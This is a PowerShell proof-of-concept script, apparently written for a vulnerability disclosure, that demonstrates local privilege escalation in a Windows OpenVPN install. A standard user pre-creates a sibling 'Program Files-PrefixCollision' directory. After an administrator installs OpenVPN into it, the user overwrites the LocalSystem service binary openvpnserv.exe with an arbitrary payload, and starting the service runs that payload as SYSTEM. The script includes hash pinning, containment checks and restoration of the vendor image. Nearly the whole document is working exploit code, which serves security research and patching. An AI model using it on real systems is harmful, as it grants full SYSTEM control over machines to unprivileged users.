#requires -Version 5.1
[CmdletBinding()]
param(
    [Parameter(Mandatory = $true)]
    [ValidateSet('Prepare', 'Install', 'Replace', 'Observe')]
    [string] $Phase,
    [string] $MsiPath,
    [string] $PayloadPath,
    [ValidateRange(2, 30)]
    [int] $ObservationTimeoutSeconds = 10
)

$ErrorActionPreference = 'Stop'
Set-StrictMode -Version 2.0

$ExpectedMsiSha256 = '33104DD02C48CBA172612882B1AF6276422B1B4340D4C9C84DD2AFB4B356FE9F'
$ProgramFilesRoot = if ($env:ProgramW6432) { $env:ProgramW6432 } else { $env:ProgramFiles }
$CollisionParent = $ProgramFilesRoot.TrimEnd('\') + '-PrefixCollision'
$InstallRoot = Join-Path $CollisionParent 'OpenVPN'
$ServiceImagePath = Join-Path $InstallRoot 'bin\openvpnserv.exe'
$StateRoot = Join-Path $env:ProgramData 'OpenVPNPrefixAclLocalSystemPoC'
$PublicRoot = Join-Path $env:PUBLIC 'Documents\OpenVPNPrefixAclLocalSystemPoC'
$PreparePath = Join-Path $PublicRoot 'prepare.json'
$ReplacePath = Join-Path $PublicRoot 'replace.json'
$SetupPath = Join-Path $StateRoot 'setup.json'
$ResultPath = Join-Path $StateRoot 'result.json'
$MarkerPath = Join-Path $StateRoot 'protected-marker.json'
$BackupPath = Join-Path $StateRoot 'openvpnserv.exe.vendor-backup'
$MarkerBaseline = "OPENVPN-PREFIX-ACL-LOCALSYSTEM-POC-BASELINE`r`n"
$ExpectedSystemSid = 'S-1-5-18'

function Write-Stage([string] $Label, [string] $Message) {
    Write-Host ('[{0}] {1}' -f $Label.ToUpperInvariant(), $Message) -ForegroundColor Cyan
}

function Write-Ok([string] $Message) {
    Write-Host ('  OK: {0}' -f $Message) -ForegroundColor Green
}

function Test-Administrator {
    $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($identity)
    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Assert-Administrator {
    if (-not (Test-Administrator)) { throw ('Phase {0} requires an elevated administrator token.' -f $Phase) }
}

function Assert-StandardUser {
    $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
    if ((Test-Administrator) -or @($identity.Groups | Where-Object { $_.Value -eq 'S-1-5-32-544' }).Count -ne 0) {
        throw ('Phase {0} requires a true standard-user token.' -f $Phase)
    }
}

function Write-Utf8File([string] $LiteralPath, [string] $Text, [switch] $CreateNew) {
    $mode = if ($CreateNew) { [IO.FileMode]::CreateNew } else { [IO.FileMode]::Create }
    $bytes = (New-Object Text.UTF8Encoding($false)).GetBytes($Text)
    $stream = New-Object IO.FileStream($LiteralPath, $mode, [IO.FileAccess]::Write, [IO.FileShare]::Read)
    try { $stream.Write($bytes, 0, $bytes.Length); $stream.Flush($true) }
    finally { $stream.Dispose() }
}

function Write-Json([string] $LiteralPath, $Value, [switch] $CreateNew) {
    Write-Utf8File -LiteralPath $LiteralPath -Text (($Value | ConvertTo-Json -Depth 10) + "`r`n") -CreateNew:$CreateNew
}

function Read-Json([string] $LiteralPath) {
    if (-not (Test-Path -LiteralPath $LiteralPath -PathType Leaf)) { throw ('Required record is absent: {0}' -f $LiteralPath) }
    return Get-Content -LiteralPath $LiteralPath -Raw -Encoding UTF8 | ConvertFrom-Json
}

function Initialize-FileIdentityInterop {
    if ('OpenVpnPrefixAclLocalSystemPoC.NativeMethods' -as [type]) { return }
    Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
using Microsoft.Win32.SafeHandles;
namespace OpenVpnPrefixAclLocalSystemPoC
{
    [StructLayout(LayoutKind.Sequential)]
    public struct FileInformation
    {
        public uint FileAttributes;
        public System.Runtime.InteropServices.ComTypes.FILETIME CreationTime;
        public System.Runtime.InteropServices.ComTypes.FILETIME LastAccessTime;
        public System.Runtime.InteropServices.ComTypes.FILETIME LastWriteTime;
        public uint VolumeSerialNumber;
        public uint FileSizeHigh;
        public uint FileSizeLow;
        public uint NumberOfLinks;
        public uint FileIndexHigh;
        public uint FileIndexLow;
    }
    public static class NativeMethods
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool GetFileInformationByHandle(
            SafeFileHandle fileHandle,
            out FileInformation fileInformation);
    }
}
'@
}

function Get-FilePin([string] $LiteralPath) {
    $stream = New-Object IO.FileStream($LiteralPath, [IO.FileMode]::Open, [IO.FileAccess]::Read,
        ([IO.FileShare]::ReadWrite -bor [IO.FileShare]::Delete))
    try {
        $information = New-Object OpenVpnPrefixAclLocalSystemPoC.FileInformation
        if (-not [OpenVpnPrefixAclLocalSystemPoC.NativeMethods]::GetFileInformationByHandle($stream.SafeFileHandle, [ref]$information)) {
            throw (New-Object ComponentModel.Win32Exception([Runtime.InteropServices.Marshal]::GetLastWin32Error()))
        }
        $identity = '{0:X8}:{1:X8}{2:X8}' -f $information.VolumeSerialNumber, $information.FileIndexHigh, $information.FileIndexLow
    }
    finally { $stream.Dispose() }
    [pscustomobject]@{
        path = [IO.Path]::GetFullPath($LiteralPath)
        length = [int64](Get-Item -LiteralPath $LiteralPath).Length
        sha256 = (Get-FileHash -LiteralPath $LiteralPath -Algorithm SHA256).Hash.ToUpperInvariant()
        file_identity = $identity
        sddl = (Get-Acl -LiteralPath $LiteralPath).Sddl
    }
}

function Copy-ContentInPlace([string] $Source, [string] $Destination) {
    $sourceStream = New-Object IO.FileStream($Source, [IO.FileMode]::Open, [IO.FileAccess]::Read, [IO.FileShare]::Read)
    $destinationStream = $null
    try {
        $destinationStream = New-Object IO.FileStream($Destination, [IO.FileMode]::Create, [IO.FileAccess]::Write, [IO.FileShare]::Read)
        $sourceStream.CopyTo($destinationStream)
        $destinationStream.Flush($true)
    }
    finally {
        if ($null -ne $destinationStream) { $destinationStream.Dispose() }
        $sourceStream.Dispose()
    }
}

function Set-ProtectedStateAcl {
    $systemSid = New-Object Security.Principal.SecurityIdentifier('S-1-5-18')
    $administratorsSid = New-Object Security.Principal.SecurityIdentifier('S-1-5-32-544')
    $usersSid = New-Object Security.Principal.SecurityIdentifier('S-1-5-32-545')
    $allow = [Security.AccessControl.AccessControlType]::Allow
    $inheritance = [Security.AccessControl.InheritanceFlags]::ContainerInherit -bor [Security.AccessControl.InheritanceFlags]::ObjectInherit
    $none = [Security.AccessControl.PropagationFlags]::None
    $directoryAcl = New-Object Security.AccessControl.DirectorySecurity
    $directoryAcl.SetOwner($administratorsSid)
    $directoryAcl.SetAccessRuleProtection($true, $false)
    [void]$directoryAcl.AddAccessRule((New-Object Security.AccessControl.FileSystemAccessRule($systemSid, 'FullControl', $inheritance, $none, $allow)))
    [void]$directoryAcl.AddAccessRule((New-Object Security.AccessControl.FileSystemAccessRule($administratorsSid, 'FullControl', $inheritance, $none, $allow)))
    [void]$directoryAcl.AddAccessRule((New-Object Security.AccessControl.FileSystemAccessRule($usersSid, 'ReadAndExecute', $inheritance, $none, $allow)))
    Set-Acl -LiteralPath $StateRoot -AclObject $directoryAcl
}

function Stop-AndDisableServices {
    foreach ($name in @('OpenVPNService', 'OpenVPNServiceInteractive')) {
        $service = Get-Service -Name $name -ErrorAction SilentlyContinue
        if ($null -ne $service) {
            if ($service.Status -ne 'Stopped') { Stop-Service -Name $name -Force -ErrorAction SilentlyContinue }
            Set-Service -Name $name -StartupType Disabled -ErrorAction SilentlyContinue
        }
    }
}

function Assert-ServicesContained {
    foreach ($name in @('OpenVPNService', 'OpenVPNServiceInteractive')) {
        $service = Get-CimInstance Win32_Service -Filter ("Name='{0}'" -f $name) -ErrorAction SilentlyContinue
        if ($null -ne $service -and ($service.State -ne 'Stopped' -or $service.StartMode -ne 'Disabled' -or [int]$service.ProcessId -ne 0)) {
            throw ('Service is not stopped and disabled: {0}' -f $name)
        }
    }
}

function Get-InteractiveService {
    $service = Get-CimInstance Win32_Service -Filter "Name='OpenVPNServiceInteractive'" -ErrorAction Stop
    if ($null -eq $service) { throw 'OpenVPNServiceInteractive is absent.' }
    if ([string]$service.StartName -ine 'LocalSystem') { throw ('Unexpected service identity: {0}' -f $service.StartName) }
    if ([string]$service.ServiceType -ine 'Share Process') { throw ('Unexpected service type: {0}' -f $service.ServiceType) }
    $rawPath = [Environment]::ExpandEnvironmentVariables([string]$service.PathName).Trim()
    if ($rawPath -ine $ServiceImagePath -and $rawPath -ine ('"' + $ServiceImagePath + '"')) {
        throw ('Unexpected service ImagePath or arguments: {0}' -f $rawPath)
    }
    return $service
}

function Invoke-Msi([string] $VerifiedMsiPath, [string[]] $Arguments, [string] $Label) {
    $allArguments = @('/i', ('"{0}"' -f $VerifiedMsiPath)) + $Arguments
    $process = Start-Process -FilePath (Join-Path $env:SystemRoot 'System32\msiexec.exe') -ArgumentList $allArguments -Wait -PassThru -WindowStyle Hidden
    if ($process.ExitCode -notin @(0, 3010)) { throw ('{0} failed with msiexec exit code {1}.' -f $Label, $process.ExitCode) }
}

function Test-DirectMarkerWriteDenied {
    $denied = $false
    $stream = $null
    try { $stream = New-Object IO.FileStream($MarkerPath, [IO.FileMode]::Open, [IO.FileAccess]::Write, [IO.FileShare]::ReadWrite) }
    catch [UnauthorizedAccessException] { $denied = $true }
    finally { if ($null -ne $stream) { $stream.Dispose() } }
    return $denied
}

function Read-SystemObservation {
    try {
        $record = Get-Content -LiteralPath $MarkerPath -Raw -Encoding UTF8 | ConvertFrom-Json
        if ([bool]$record.executed -and [int]$record.pid -gt 0 -and
            [string]$record.sid -eq $ExpectedSystemSid -and
            [string]$record.service -eq 'OpenVPNServiceInteractive') { return $record }
    }
    catch { }
    return $null
}

function Invoke-Prepare {
    Assert-StandardUser
    Write-Stage 'PREPARE' 'Create the textual-sibling installation root as the standard user.'
    if (Test-Path -LiteralPath $CollisionParent) { throw ('Collision path already exists: {0}' -f $CollisionParent) }
    if (@(Get-Service -Name @('OpenVPNService', 'OpenVPNServiceInteractive') -ErrorAction SilentlyContinue).Count -ne 0) {
        throw 'OpenVPN is already installed; use a clean disposable system.'
    }
    if (Test-Path -LiteralPath 'HKLM:\SOFTWARE\OpenVPN') { throw 'OpenVPN registry state already exists; use a clean disposable system.' }
    [void](New-Item -ItemType Directory -Path $InstallRoot -Force)
    [void](New-Item -ItemType Directory -Path $PublicRoot -Force)
    $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
    $record = [ordered]@{
        phase = 'Prepare'
        user_identity = [string]$identity.Name
        user_sid = [string]$identity.User.Value
        install_root = $InstallRoot
    }
    Write-Json -LiteralPath $PreparePath -Value $record -CreateNew
    Write-Ok ('standard user {0} created {1}' -f $identity.User.Value, $InstallRoot)
    [pscustomobject]$record
}

function Invoke-Install {
    Assert-Administrator
    Write-Stage 'INSTALL' 'Verify the pinned MSI, install into the textual sibling, and pin the LocalSystem service image.'
    $prepare = Read-Json -LiteralPath $PreparePath
    if ([string]$prepare.install_root -ine $InstallRoot) { throw 'The prepared install root differs from the fixed PoC path.' }
    if ([string]::IsNullOrWhiteSpace($MsiPath) -or -not (Test-Path -LiteralPath $MsiPath -PathType Leaf)) { throw 'Install requires -MsiPath.' }
    $resolvedMsi = [IO.Path]::GetFullPath($MsiPath)
    $msiHash = (Get-FileHash -LiteralPath $resolvedMsi -Algorithm SHA256).Hash.ToUpperInvariant()
    $msiSignature = Get-AuthenticodeSignature -LiteralPath $resolvedMsi
    if ($msiHash -ne $ExpectedMsiSha256 -or
        $msiSignature.Status -ne [Management.Automation.SignatureStatus]::Valid -or
        $null -eq $msiSignature.SignerCertificate -or $msiSignature.SignerCertificate.Subject -notlike '*OpenVPN Inc.*') {
        throw 'The MSI hash or OpenVPN Authenticode signature differs.'
    }
    if (Test-Path -LiteralPath $StateRoot) { throw ('PoC state already exists: {0}' -f $StateRoot) }
    [void](New-Item -ItemType Directory -Path $StateRoot)
    Set-ProtectedStateAcl
    Write-Utf8File -LiteralPath $MarkerPath -Text $MarkerBaseline -CreateNew
    $logCore = Join-Path $StateRoot 'install-core.log'
    $logService = Join-Path $StateRoot 'install-service.log'
    $remove = 'OpenVPN.GUI,OpenVPN.Service,OpenVPN.Documentation,OpenVPN.SampleCfg,OpenVPN.GUI.OnLogon,OpenVPN.PLAP.Register,Drivers,Drivers.TAPWindows6,Drivers.OvpnDco,OpenSSL,EasyRSA'
    try {
        Invoke-Msi -VerifiedMsiPath $resolvedMsi -Label 'Core installation' -Arguments @(
            'ADDLOCAL=OpenVPN', ('REMOVE={0}' -f $remove), ('INSTALLDIR="{0}"' -f $InstallRoot),
            '/qn', '/norestart', 'REBOOT=ReallySuppress', '/L*v', ('"{0}"' -f $logCore))
        Invoke-Msi -VerifiedMsiPath $resolvedMsi -Label 'Service installation' -Arguments @(
            'ADDLOCAL=OpenVPN.Service', 'REMOVE=OpenVPN.PLAP.Register',
            '/qn', '/norestart', 'REBOOT=ReallySuppress', '/L*v', ('"{0}"' -f $logService))
    }
    finally { Stop-AndDisableServices }
    Assert-ServicesContained
    $service = Get-InteractiveService
    $imageSignature = Get-AuthenticodeSignature -LiteralPath $ServiceImagePath
    if ($imageSignature.Status -ne [Management.Automation.SignatureStatus]::Valid -or
        $null -eq $imageSignature.SignerCertificate -or $imageSignature.SignerCertificate.Subject -notlike '*OpenVPN Inc.*') {
        throw 'The installed service image lacks the expected OpenVPN signature.'
    }
    $image = Get-FilePin -LiteralPath $ServiceImagePath
    Copy-Item -LiteralPath $ServiceImagePath -Destination $BackupPath
    $backup = Get-FilePin -LiteralPath $BackupPath
    if ($backup.sha256 -ne $image.sha256) { throw 'The protected recovery copy hash differs.' }
    $marker = Get-FilePin -LiteralPath $MarkerPath
    $record = [ordered]@{
        phase = 'Install'
        user_sid = [string]$prepare.user_sid
        msi_sha256 = $msiHash
        msi_signer = [string]$msiSignature.SignerCertificate.Subject
        install_root = $InstallRoot
        service = [ordered]@{
            name = [string]$service.Name
            account = [string]$service.StartName
            type = [string]$service.ServiceType
            path_name = [string]$service.PathName
        }
        service_image = $image
        service_image_signer = [string]$imageSignature.SignerCertificate.Subject
        protected_backup = $backup
        marker_before = $marker
    }
    Write-Json -LiteralPath $SetupPath -Value $record -CreateNew
    Write-Ok ('signed service image pinned at {0}; SHA-256 {1}' -f $ServiceImagePath, $image.sha256)
    [pscustomobject]$record
}

function Invoke-Replace {
    Assert-StandardUser
    Write-Stage 'REPLACE' 'Confirm marker denial and overwrite the exact stopped LocalSystem service image.'
    Assert-ServicesContained
    $prepare = Read-Json -LiteralPath $PreparePath
    $setup = Read-Json -LiteralPath $SetupPath
    $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
    if ($identity.User.Value -ne [string]$prepare.user_sid -or $identity.User.Value -ne [string]$setup.user_sid) {
        throw 'Use the same standard-user SID that prepared the collision path.'
    }
    if ([string]::IsNullOrWhiteSpace($PayloadPath) -or -not (Test-Path -LiteralPath $PayloadPath -PathType Leaf)) { throw 'Replace requires -PayloadPath.' }
    $resolvedPayload = [IO.Path]::GetFullPath($PayloadPath)
    $markerBefore = Get-FilePin -LiteralPath $MarkerPath
    if (-not (Test-DirectMarkerWriteDenied)) { throw 'The standard user unexpectedly obtained a marker write handle.' }
    $markerAfterDeniedOpen = Get-FilePin -LiteralPath $MarkerPath
    if ($markerBefore.sha256 -ne $markerAfterDeniedOpen.sha256 -or
        $markerBefore.file_identity -ne $markerAfterDeniedOpen.file_identity -or
        $markerBefore.sddl -ne $markerAfterDeniedOpen.sddl) { throw 'The protected marker changed during the denied-write control.' }
    $before = Get-FilePin -LiteralPath $ServiceImagePath
    if ($before.sha256 -ne [string]$setup.service_image.sha256 -or
        $before.file_identity -ne [string]$setup.service_image.file_identity -or
        $before.sddl -ne [string]$setup.service_image.sddl) { throw 'The signed service image changed before replacement.' }
    $payload = Get-FilePin -LiteralPath $resolvedPayload
    $replacementAttempted = $false
    try {
        $replacementAttempted = $true
        Copy-ContentInPlace -Source $resolvedPayload -Destination $ServiceImagePath
        $after = Get-FilePin -LiteralPath $ServiceImagePath
        if ($after.sha256 -ne $payload.sha256 -or $after.sha256 -eq $before.sha256 -or
            $after.file_identity -ne $before.file_identity -or $after.sddl -ne $before.sddl) {
            throw 'The exact service-image replacement did not satisfy the hash, identity, and ACL gates.'
        }
        $record = [ordered]@{
            phase = 'Replace'
            user_identity = [string]$identity.Name
            user_sid = [string]$identity.User.Value
            marker_direct_write_denied = $true
            replacement_method = 'in_place_truncate_and_write'
            service_image_before = $before
            payload = $payload
            service_image_after = $after
            marker_after_denied_open = $markerAfterDeniedOpen
        }
        Write-Json -LiteralPath $ReplacePath -Value $record -CreateNew
    }
    catch {
        $replaceError = $_.Exception.Message
        if ($replacementAttempted) {
            try {
                Copy-ContentInPlace -Source $BackupPath -Destination $ServiceImagePath
                $recovered = Get-FilePin -LiteralPath $ServiceImagePath
                if ($recovered.sha256 -ne [string]$setup.service_image.sha256 -or
                    $recovered.file_identity -ne [string]$setup.service_image.file_identity -or
                    $recovered.sddl -ne [string]$setup.service_image.sddl) {
                    throw 'The standard-user recovery did not restore the original image.'
                }
            }
            catch { throw ('Replace failed: {0}; recovery also failed: {1}' -f $replaceError, $_.Exception.Message) }
        }
        throw $replaceError
    }
    Write-Ok ('standard user replaced the exact service image; SHA-256 {0}' -f $after.sha256)
    [pscustomobject]$record
}

function Invoke-Observe {
    Assert-Administrator
    Write-Stage 'OBSERVE' 'Start only the unchanged LocalSystem service, bind its process to the marker, and restore the vendor image.'
    $setup = Read-Json -LiteralPath $SetupPath
    $replace = $null
    $service = $null
    $imageBeforeStart = $null
    $markerBefore = $null
    $observation = $null
    $serviceAtObservation = $null
    $processAtObservation = $null
    $processOwnerSid = $null
    $operationError = $null
    $restoreError = $null
    try {
        $replace = Read-Json -LiteralPath $ReplacePath
        Assert-ServicesContained
        $service = Get-InteractiveService
        $imageBeforeStart = Get-FilePin -LiteralPath $ServiceImagePath
        $markerBefore = Get-FilePin -LiteralPath $MarkerPath
        if (-not [bool]$replace.marker_direct_write_denied -or
            $imageBeforeStart.sha256 -ne [string]$replace.service_image_after.sha256 -or
            $imageBeforeStart.file_identity -ne [string]$replace.service_image_after.file_identity -or
            $imageBeforeStart.sddl -ne [string]$replace.service_image_after.sddl -or
            $markerBefore.sha256 -ne [string]$setup.marker_before.sha256 -or
            $markerBefore.file_identity -ne [string]$setup.marker_before.file_identity -or
            $markerBefore.sddl -ne [string]$setup.marker_before.sddl) {
            throw 'The replacement or protected-marker precondition is not stable.'
        }
        Set-Service -Name 'OpenVPNServiceInteractive' -StartupType Manual
        Start-Service -Name 'OpenVPNServiceInteractive'
        $deadline = [DateTime]::UtcNow.AddSeconds($ObservationTimeoutSeconds)
        do {
            Start-Sleep -Milliseconds 100
            $observation = Read-SystemObservation
            $serviceAtObservation = Get-CimInstance Win32_Service -Filter "Name='OpenVPNServiceInteractive'"
            if ($null -ne $observation -and [int]$serviceAtObservation.ProcessId -eq [int]$observation.pid -and
                $serviceAtObservation.State -eq 'Running') { break }
        } while ([DateTime]::UtcNow -lt $deadline)
        if ($null -eq $observation -or [int]$serviceAtObservation.ProcessId -ne [int]$observation.pid -or
            $serviceAtObservation.State -ne 'Running') { throw 'LocalSystem execution was not observed.' }
        $processAtObservation = Get-CimInstance Win32_Process -Filter ('ProcessId={0}' -f [int]$observation.pid)
        if ($null -eq $processAtObservation -or
            [IO.Path]::GetFullPath([string]$processAtObservation.ExecutablePath) -ine [IO.Path]::GetFullPath($ServiceImagePath)) {
            throw 'The observed process does not map to the replaced service image.'
        }
        $owner = Invoke-CimMethod -InputObject $processAtObservation -MethodName GetOwnerSid
        if ([uint32]$owner.ReturnValue -ne 0 -or [string]$owner.Sid -ne $ExpectedSystemSid) {
            throw 'The independent process-owner query did not identify LocalSystem.'
        }
        $processOwnerSid = [string]$owner.Sid
    }
    catch { $operationError = $_.Exception.Message }
    finally {
        try {
            Stop-AndDisableServices
            $quiescenceDeadline = [DateTime]::UtcNow.AddSeconds(10)
            do {
                $activeServices = @(Get-CimInstance Win32_Service | Where-Object {
                    $_.Name -in @('OpenVPNService', 'OpenVPNServiceInteractive') -and
                    ($_.State -ne 'Stopped' -or [int]$_.ProcessId -ne 0)
                })
                $activeProcesses = @(Get-CimInstance Win32_Process | Where-Object { $_.Name -like 'openvpn*' })
                if ($activeServices.Count -eq 0 -and $activeProcesses.Count -eq 0) { break }
                Start-Sleep -Milliseconds 100
            } while ([DateTime]::UtcNow -lt $quiescenceDeadline)
            if ($activeServices.Count -ne 0 -or $activeProcesses.Count -ne 0) {
                throw 'OpenVPN services or processes did not quiesce before restoration.'
            }
            Copy-ContentInPlace -Source $BackupPath -Destination $ServiceImagePath
            $restored = Get-FilePin -LiteralPath $ServiceImagePath
            $restoredSignature = Get-AuthenticodeSignature -LiteralPath $ServiceImagePath
            if ($restored.sha256 -ne [string]$setup.service_image.sha256 -or
                $restored.file_identity -ne [string]$setup.service_image.file_identity -or
                $restored.sddl -ne [string]$setup.service_image.sddl -or
                $restoredSignature.Status -ne [Management.Automation.SignatureStatus]::Valid -or
                $null -eq $restoredSignature.SignerCertificate -or $restoredSignature.SignerCertificate.Subject -notlike '*OpenVPN Inc.*') {
                throw 'The vendor image was not restored by hash, identity, ACL, and signature.'
            }
            Remove-Item -LiteralPath $BackupPath -Force
        }
        catch { $restoreError = $_.Exception.Message }
    }
    if ($null -ne $restoreError) { throw ('Service-image restoration failed: {0}' -f $restoreError) }
    if ($null -ne $operationError) { throw $operationError }
    Assert-ServicesContained
    $markerAfter = Get-FilePin -LiteralPath $MarkerPath
    $restoredImage = Get-FilePin -LiteralPath $ServiceImagePath
    $restoredSignature = Get-AuthenticodeSignature -LiteralPath $ServiceImagePath
    if ($markerAfter.sha256 -eq $markerBefore.sha256 -or
        $markerAfter.file_identity -ne $markerBefore.file_identity -or
        $markerAfter.sddl -ne $markerBefore.sddl) {
        throw 'The LocalSystem effect was not bound to the protected marker object and ACL.'
    }
    $record = [ordered]@{
        phase = 'Observe'
        outcome = 'LOCALSYSTEM_SERVICE_IMAGE_CODE_EXECUTION_OBSERVED'
        service_account = [string]$service.StartName
        service_type = [string]$service.ServiceType
        service_path_name = [string]$service.PathName
        marker_direct_write_denied = $true
        executed_identity = [string]$observation.identity
        executed_sid = [string]$observation.sid
        executed_pid = [int]$observation.pid
        service_pid = [int]$serviceAtObservation.ProcessId
        process_owner_sid = $processOwnerSid
        process_executable_path = [string]$processAtObservation.ExecutablePath
        replacement_image = $imageBeforeStart
        marker_before = $markerBefore
        marker_after = $markerAfter
        vendor_image_restored = $true
        restored_image = $restoredImage
        restored_signature = [ordered]@{
            status = [string]$restoredSignature.Status
            subject = [string]$restoredSignature.SignerCertificate.Subject
        }
        cleanup_complete = $true
    }
    Write-Json -LiteralPath $ResultPath -Value $record -CreateNew
    Write-Ok ('LocalSystem execution observed; SID {0}; PID {1}; vendor image restored' -f $observation.sid, $observation.pid)
    [pscustomobject]$record
}

if ($PSVersionTable.PSEdition -ne 'Desktop' -or $PSVersionTable.PSVersion.Major -ne 5 -or [IntPtr]::Size -ne 8) {
    throw 'Use 64-bit Windows PowerShell 5.1.'
}
Initialize-FileIdentityInterop
switch ($Phase) {
    'Prepare' { Invoke-Prepare }
    'Install' { Invoke-Install }
    'Replace' { Invoke-Replace }
    'Observe' { Invoke-Observe }
}
